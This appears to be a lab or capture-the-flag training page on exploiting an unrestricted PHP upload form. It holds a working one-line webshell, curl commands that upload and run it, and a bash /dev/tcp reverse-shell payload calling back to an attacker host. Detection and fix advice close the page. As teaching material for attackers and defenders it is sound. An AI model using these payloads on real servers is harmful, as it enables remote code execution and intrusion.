# C09 · Station A — Unrestricted upload · ★☆☆☆

> **Chapter:** [[Chapter-09-Overview]] · **Next:** [[C09-Station-B-Upload-Filter-Bypass]]
> **Host:** `hollow-portal-01` (`target-web`) · **Target:** `/upload.php` → `/uploads/`
> **The bug:** the uploader writes your file, with your name and extension, into a web-served directory that runs PHP. Upload a `.php` webshell, request it, you have RCE.

The simplest route in the chapter, and the one every other upload bug is measured against: no type check, no extension check, no storage outside the webroot.

---

## 1. Exploit — do this first

```bash
# a one-line webshell
attacker$ echo '<?php system($_GET["c"]); ?>' > shell.php
attacker$ curl -F "file=@shell.php" http://target-web/upload.php
attacker$ curl 'http://target-web/uploads/shell.php?c=id'
uid=33(www-data) gid=33(www-data) groups=33(www-data)
attacker$ curl 'http://target-web/uploads/shell.php?c=cat+/var/www/flag.txt'
R2R{w3b_rce_is_your_front_d00r}
```

Then a reverse shell (listener `nc -lvnp 4444` on the attacker):

```bash
attacker$ curl -G 'http://target-web/uploads/shell.php' \
  --data-urlencode 'c=bash -c "bash -i >& /dev/tcp/attacker/4444 0>&1"'
```

| Token | What it does |
|---|---|
| `curl -F "file=@shell.php"` | multipart upload; `file` is the form field `upload.php` reads |
| `<?php system($_GET['c']); ?>` | the webshell: run whatever `?c=` says, as `www-data` |
| `/uploads/shell.php` | the file is served back here and **executed** by mod_php |
| `?c=cat+/var/www/flag.txt` | `+` is a space; reads the foothold flag |
| `bash -c "…/dev/tcp/…"` | upgrade to an interactive reverse shell — see [[Reverse-Shell-Reference]] |

---

## 2. How you find it

```bash
attacker$ curl -s http://target-web/upload.php | grep -i 'any file\|uploads'
  <p>Files are stored … served back at <code>/uploads/&lt;name&gt;</code>. Any file type is accepted.</p>
```

The page says it keeps your filename and serves it under `/uploads/`. Upload a harmless `test.txt`, fetch `/uploads/test.txt`, confirm it round-trips — then swap in `.php`.

---

## 3. Why it works

mod_php maps any file ending in `.php` to the PHP interpreter, **anywhere under the document root**. The uploader preserves your extension and writes into `/var/www/html/uploads/` — inside the docroot, execution on. So the file you upload becomes a script you can request, and it runs as the Apache user, `www-data`.

---

## 4. Pitfalls

- **`system()` runs under `/bin/sh` (dash)**, which has no `/dev/tcp` and no `>&`. For a reverse shell, wrap the redirect in `bash -c "…"` so *bash* parses it. See [[Reverse-Shell-Reference]].
- **URL-encode your command** when it has spaces/metacharacters — `curl -G --data-urlencode 'c=…'` does it for you.
- This is the win on an *un*filtered uploader. When `.php` is blocked, you need [[C09-Station-B-Upload-Filter-Bypass]].

---

## 5. Detect & fix

- **Detect:** any new `.php`/`.phtml`/`.pht` in an upload directory is an incident; a `POST /upload.php` immediately followed by `GET /uploads/<x>.php?c=…` is the signature. Recipes in [[Blue-Team-Playbook]].
- **Fix:** store uploads **outside** the docroot and stream them back as attachments; allow-list extensions and re-encode images; turn PHP execution off for the upload path; randomise stored names. More in [[Blue-Team-Playbook]].

---

## 6. What you learned

- A web-served directory that runs PHP + an uploader that keeps your extension = RCE. Keep the two apart.
- The webshell → reverse-shell step is universal; you reuse it in every station this chapter.
- Next, the same win when the admin "fixed" it with a filter: [[C09-Station-B-Upload-Filter-Bypass]].

> Next: [[C09-Station-B-Upload-Filter-Bypass]] · Related: [[Reverse-Shell-Reference]] · [[Blue-Team-Playbook]]
